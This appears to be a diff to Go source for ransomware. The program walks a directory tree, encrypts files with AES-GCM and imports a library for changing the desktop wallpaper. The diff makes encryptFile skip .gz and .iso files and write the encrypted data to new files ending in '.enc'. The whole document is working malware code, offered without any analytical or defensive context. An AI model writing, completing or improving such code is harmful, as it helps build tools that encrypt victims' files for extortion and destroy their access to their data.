@@ -11,6 +11,7 @@ import (
 	"encoding/hex"
 	"net/url"
 	"fmt"
+	"path/filepath"
 	"github.com/reujab/wallpaper"
 	"net/http"
 	"runtime"
@@ -118,6 +119,9 @@ func traverseFiles(path string) {
 }
 
 func encryptFile(path string) {
+	if filepath.Ext(path) == ".gz" || filepath.Ext(path) == ".iso" {
+		return
+	}
 	data, err := os.ReadFile(path)
 	if err != nil {
 		fmt.Println(err)
@@ -148,7 +152,8 @@ func encryptFile(path string) {
 
 	enc := gcm.Seal(nil, nonce, data, nil)
 	d := append(nonce, enc...)
-	err = os.WriteFile(path, d, fi.Mode().Perm())
+	p := fmt.Sprintf("%s.enc", path)
+	err = os.WriteFile(p, d, fi.Mode().Perm())
 	if err != nil {
 		fmt.Println(err)
 	}
